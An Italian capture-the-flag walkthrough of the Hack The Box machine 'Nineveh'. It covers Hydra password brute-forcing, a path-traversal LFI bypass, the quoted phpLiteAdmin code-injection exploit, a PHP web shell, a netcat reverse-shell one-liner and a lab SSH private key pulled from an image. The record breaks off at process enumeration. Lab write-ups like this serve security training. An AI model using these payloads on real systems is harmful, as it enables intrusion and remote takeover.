**Author: Noto La Diega Alessandro**

**Target: 10.10.10.43**

# INFORMATION GATHERING

Iniziamo con un semplice scan [[Nmap]]

```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# nmap -sC -sV -O -min-rate=5000 10.10.10.43 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-21 07:09 EDT
Nmap scan report for 10.10.10.43
Host is up (0.047s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.25 seconds

```

Uno scan su tutte le porte e UDP non da nessuna nuova informazione 

Prima di proseguire con l'enumerazione facciamo il punto della situazione 

- Abbiamo solo due punti di ingresso: la porta 80 e la porta 443.
- La scansione nmap ci da il nome di dominio della macchina: nineveh.htb.
- Il certificato SSL sulla porta 443 è scaduto, quindi dovremo disabilitare il controllo TLS durante l'esecuzione dei nostri tool.

# ENUMERATION 

Come prima cosa aggiungiamo nineveh.htb al nostro /etc/hosts

```bash
10.10.10.43 nineveh.htb
```

## Port 80

Visitiamo la porta 80 ci restituisce la pagina di default dell web server ad anche guardano il codice sorgente non otteniamo nessuna nuova informazione.

Proviamo ad enumerare con gobuseter

```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# gobuster dir -u nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nineveh.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/22 06:13:36 Starting gobuster in directory enumeration mode
===============================================================
/department           (Status: 301) [Size: 315] [--> http://nineveh.htb/department/]
/server-status (Status: 403)  
===============================================================  
2019/12/28 09:20:06 Finished  
===============================================================

```

Visitando http://nineveh.htb/department ci troviamo davanti ad un prompt di login 
proviamo delle credenziali di default  ma non otteniamo l'accesso, da notare però che utilizzando l'username `admin` otteniamo come risposata `invalid password` questo potrebbe significare che l'utente `admin` esiste ma non la password non è corretta.

Proviamo ad analizare il codice sorgente dell pagina ,
troviamo questo commento :

```
<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->

```

Questa nota ci suggerisce che è installato MySQL e che probabilmente ha qualche bug

Proviamo ad analizzare la richiesta tramite burp:

```bash
POST /department/login.php HTTP/1.1
Host: 10.10.10.43
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://10.10.10.43
Connection: close
Referer: http://10.10.10.43/department/login.php
Cookie: PHPSESSID=mdreditl0mjl02ku2fp9vvg3t4
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```


Proviamo a forzare la password con hydra:

```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password" -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-22 07:06:07
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://nineveh.htb:80/department/login.php:username=^USER^&password=^PASS^:Invalid Password
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-22 07:06:57

```

- -l: specifica il nome utente per essere admin.
- -P: specifica il file che contiene le password.
   http-post-form: specifica una richiesta HTTP POST. 
-  “….”: il contenuto tra virgolette specifica i parametri username/password da testare e il messaggio di login fallito.

Abbiamo delle credenziali 
admin:1q2w3e4r5t

Loggandoci  veniamo reindirizzati a http://10.10.10.43/department/manage.php  e ci troviamo davanti un immagine che ci dice ce il sito è in costruzione.

All'indirizzo http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt abbiamo questa nota:

```bash
Have you fixed the login page yet! hardcoded username and password is really bad idea!

check your serect folder to get in! figure it out! this is your challenge

Improve the db interface.
~amrois
```

Niente di tutto ciò ha molto senso a questo punto. Menzionano una cartella segreta. Forse lo troveremo durante l'enumerazione della porta 443. Una cosa da notare è che l'URL che genera la pagina sembra un percorso di file.

`http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt`

Quando vediamo un percorso di file, la prima cosa che bisognerebbe provare è un LFI. Ho provato e non ha funzionato esattamente. Quando provo la seguente stringa

```
../../../../../../../etc/passwd
```

Ricevo un messaggio "Nessuna nota selezionata". Tuttavia, quando provo la seguente stringa

```
files/ninevehNotes/../../../../etc/passwd
```

Ricevo un messaggio di avviso.

```
Warning:  include(files/ninevehNotes/../../../../etc/passwd): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line 31



Warning:  include(): Failed opening 'files/ninevehNotes/../../../../etc/passwd' for inclusion (include_path='.:/usr/share/php') in /var/www/html/department/manage.php on line 31

```

Se rimuovo "ninevehNotes" dall'URL

```
files/../../../../etc/passwd
```

Sono tornato al messaggio "Nessuna nota selezionata". Questo mi porta a credere che sia vulnerabile a LFI, tuttavia, c'è un controllo sul backend che cerca la stringa "ninevehNotes" poiché la mia query non funziona senza di essa.
Secondo l'errore, siamo nella directory /www/html/department/, quindi dobbiamo andare tre directory sopra. Proviamo con questa stringa.

```
[http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../etc/passwd]
```

Funziona !!

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin

```

Quando si tratta di LFI, di solito è necessario collegarlo a un'altra vulnerabilità per ottenere l'esecuzione di codice in modalità remota. Pertanto, inizierò a enumerare la prossima porta per vedere se riesco a trovare un'altra vulnerabilità a cui posso concatenare questa.

## Port 443

Visitando https://10.10.10.43:443/ otteniamo solo un immagine.
analizzando i certificati SSL riusciamo ad ottenere un indirizzo email 
admin@nineveh.htb potrebbe tornaci utile per l'enumerazione

Proviamo ad enumerare con gobuster

```bash
```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://nineveh.htb -k
```

- dir: utilizza la modalità di forzatura bruta directory/file.
- -w: percorso dell'elenco di parole.
- -u: l'URL o il dominio di destinazione.
- -k: ignora la verifica del certificato SSL.

Otteniamo quanto segue:

```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://nineveh.htb -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://nineveh.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/23 03:35:29 Starting gobuster in directory enumeration mode
===============================================================
/db                   (Status: 301) [Size: 309] [--> https://nineveh.htb/db/]
/server-status        (Status: 403) [Size: 300]
/secure_notes         (Status: 301) [Size: 319] [--> https://nineveh.htb/secure_notes/]
===============================================================
2023/06/23 03:46:37 Finished
===============================================================

```

Visitando http://10.10.10.43/server-status otteniamo un errore 403 

Forbidden
You don't have permission to access /server-status on this server.
Apache/2.4.18 (Ubuntu) Server at 10.10.10.43 Port 80

Non abbiamo  i permessi 

Visitando https://10.10.10.43/secure_notes/ ci troviamo di fronte un'immagine 

Questo potrebbe essere ciò a cui si riferiva il commento "controlla la tua cartella segreta". Salviamo l'immagine, potrebbe contenere un segreto. Lo esamineremo più tardi.

Visitando https://10.10.10.43/db/ ci troviamo di fronte un prompt di login di un applicazione 
`phpLiteAdmin v1.9` e un messaggio di warning 

```
Warning: rand() expects parameter 2 to be integer, float given in /var/www/ssl/db/index.php on line 114
```

Ho provato con delle credenziali di admin e  non ha funzionato proverò con hydra 
Prima intercettiamo una richiesta con burp per vedere quali argomenti dare a hydra

```
POST /db/index.php HTTP/1.1
Host: 10.10.10.43
Cookie: PHPSESSID=mdreditl0mjl02ku2fp9vvg3t4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.10.10.43/db/
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: https://10.10.10.43
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

password=admin&remember=yes&login=Log+In&proc_login=true

```

Utilizziamo hydra

```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&Login=Login:Incorrect password."
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-23 03:58:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-forms://nineveh.htb:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&Login=Login:Incorrect password.
[STATUS] 1341.00 tries/min, 1341 tries in 00:01h, 14343058 to do in 178:16h, 16 active
[443][http-post-form] host: nineveh.htb   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-23 03:59:46


```

- -l: specifica il nome utente per essere admin.
- -P: specifica il file che contiene le password.
- http-post-form: stiamo inviando una richiesta POST.
- “….”: il contenuto tra virgolette specifica i parametri username/password da testare e il messaggio di login fallito.

Abbiamo una password valida! 
password123

Utilizziamo  password123 per accedere all'applicazione. Poiché si tratta di un'applicazione pronta all'uso, utilizziamo searchsploit per scoprire se è associata a qualche vulnerabilità.

```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# searchsploit phpLiteAdmin 1.9 
---------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title  |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities| php/webapps/39714.txt
---------------------------------------------------------------------------------
Shellcodes: No Results
Papers: No Results

```

Perfetto abbiamo una Remote Code Injection, lo scarichiamo e gli diamo un occhiata

```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# searchsploit -m 24044.txt    
  Exploit: PHPLiteAdmin 1.9.3 - Remote PHP Code Injection
      URL: https://www.exploit-db.com/exploits/24044
     Path: /usr/share/exploitdb/exploits/php/webapps/24044.txt
    Codes: OSVDB-89126
 Verified: True
File Type: ASCII text
Copied to: /home/kali/htb/nineveh/24044.txt

┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# cat 24044.txt          
# Exploit Title: phpliteadmin <= 1.9.3 Remote PHP Code Injection Vulnerability
# Google Dork: inurl:phpliteadmin.php (Default PW: admin)
# Date: 01/10/2013
# Exploit Author: L@usch - http://la.usch.io - http://la.usch.io/files/exploits/phpliteadmin-1.9.3.txt
# Vendor Homepage: http://code.google.com/p/phpliteadmin/
# Vendor Status: Informed
# Software Link: http://phpliteadmin.googlecode.com/files/phpliteadmin_v1-9-3.zip
# Version: 1.9.3
# Tested on: Windows and Linux

Description:

phpliteadmin.php#1784: 'Creating a New Database' =>
phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.',

An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.

Proof of Concept:

1. We create a db named "hack.php".
(Depending on Server configuration sometimes it will not work and the name for the db will be "hack.sqlite". Then simply try to rename the database / existing database to "hack.php".)
The script will store the sqlite database in the same directory as phpliteadmin.php.
Preview: http://goo.gl/B5n9O
Hex preview: http://goo.gl/lJ5iQ

2. Now create a new table in this database and insert a text field with the default value:
<?php phpinfo()?>
Hex preview: http://goo.gl/v7USQ

3. Now we run hack.php

Done!

Proof: http://goo.gl/ZqPVL  
```

Vediamo il contenuto dell'exploit Remote PHP Code Injection. Secondo i commenti fatti nell'exploit, un utente malintenzionato può creare un database sqlite con un'estensione php e inserire codice php come campi di testo. Al termine, l'attaccante può eseguirlo semplicemente accedendo al file del database utilizzando il browser.
Questa è esattamente la vulnerabilità che speravo di trovare! Questa vulnerabilità mi consente di rilasciare un file dannoso sul server e la vulnerabilità LFI che abbiamo riscontrato in precedenza mi consente di chiamare ed eseguire il mio file dannoso.


# GAINING AN INITIAL FOOTHOLD

Tornando all'applicazione, Nella sezione Crea nuovo database, creiamo un nuovo database chiamato hack.php. Quindi facciamo clic su hack.php nella sezione Modifica database. 
Lì, creiamo una nuova tabella chiamata random con 1 campo. 
Nel parametro Field aggiungiamo il seguente codice e modificare il tipo in TEXT.

```bash
<?php echo system($_REQUEST ["cmd"]); ?>
```

Facciamo clic su crea e vediamo che il file viene creato nella directory /var/tmp.
Ora torniamo alla vulnerabilità LFI ed eseguiamo il nostro codice php.

```bash
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../var/tmp/hack.php&cmd=ls
```

Abbiamo l'esecuzione del codice! 

```
SQLite format 3@  -�
��`�tablerandomrandomCREATE TABLE 'random' ('css
files
footer.php
header.php
index.php
login.php
logout.php
manage.php
underconstruction.jpg
underconstruction.jpg' TEXT)
```

Ora non ci resta che sostituire il codice php del database con una reveshell in php 

```bash
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 9443 >/tmp/f"); ?>
```

Ci mettiamo in ascolto con nc 

```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# nc -lnvp 4444
listening on [any] 4444 ...
```

Utilizziamo la nostra LFI  per eseguire il codice php, ottenendo cosi la nostra shell

```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.43] 37506
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Facciamo upgrade della shell

```bash
$ which python3
/usr/bin/python3
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@nineveh:/var/www/html/department$ ^Z
zsh: suspended  nc -lnvp 4444
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

www-data@nineveh:/var/www/html/department$ xport SHELL=bash
xport: command not found
www-data@nineveh:/var/www/html/department$ export SHELL=bash
www-data@nineveh:/var/www/html/department$ export TERM=xterm-256color
www-data@nineveh:/var/www/html/department$ 

```

Proviamo a prendere la user flag ma non abbiamo i permessi in quanto il file è di proprietà  di amrois

```bash
www-data@nineveh:/home/amrois$ cat user.txt 
cat: user.txt: Permission denied
www-data@nineveh:/home/amrois$ 

www-data@nineveh:/home/amrois$ ls -l 
total 4
-rw------- 1 amrois amrois 33 Jun 20 23:35 user.txt

```

Abbiamo bisogno di aumentare i nostri privilegi 


# LATERAL MOVIMENT & PRIVESC

## www-data ---> Amrois

Andiamo nella , directory /secure_notes dove avevamo trovato l'immagine e la nota dalla pagina di accesso che diceva di controllare la cartella segreta per entrare.

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ ls 
index.html nineveh.png
```

Utilizzeremo il comando [[String]] per vedere se ci sono informazioni nascoste nell'immagine 

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ strings -n 20 nineveh.png 
-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5 FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI 3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo 9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl 1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89 P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1 MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7 fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG -----END RSA PRIVATE KEY----- ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```

Sembra essere una chiave RSA ma sono visualizzate in modo strano 

Per fare un po' più di controllo su questo, andrò  nella cartella dove abbiamo scaricato l'immagine sul mia macchina locale. 

L'eseguiamo binwalk e ci mostra che un archivio tar viene aggiunto alla fine del file:

```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# binwalk nineveh.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)


```

con il seguente comando `--run-as=root` e  `-e` estraiamo l'archivio

```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# binwalk --run-as=root nineveh.png -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)

┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# ls
24044.txt  33899.txt  nineveh.png  _nineveh.png.extracted  update
                                                                     

```

all'interno dell'archivio troviamo le chiavi id_rsa sia pubblica che privata 

```bash
┌──(root㉿kali)-[/home/…/htb/nineveh/_nineveh.png.extracted/secret]
└─# cat nineveh.priv 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[/home/…/htb/nineveh/_nineveh.png.extracted/secret]
└─# cat nineveh.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[/home/…/htb/nineveh/_nineveh.png.extracted/secret]
└─# 

```

Se ci ricordiamo bene nello scan di nmap non risultata aperta la porta SSH quindi come mai abbiamo delle chiavi RSA per connetterci ?

Proviamo ad esaminare i processi con `ps auxww

- "ps": è il comando per elencare i processi.
- "a": mostra i processi di tutti gli utenti, inclusi quelli degli utenti di sistema.
- "u": visualizza un elenco esteso che include informazioni sul proprietario del processo.
- "x": elenca anche i processi che non sono associati a un terminale.
- "ww": assicura che la larghezza delle colonne non venga limitata e che i dati vengano visualizzati in modo completo.

Notiamo questo processo

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ ps auxww 

...[snip]...
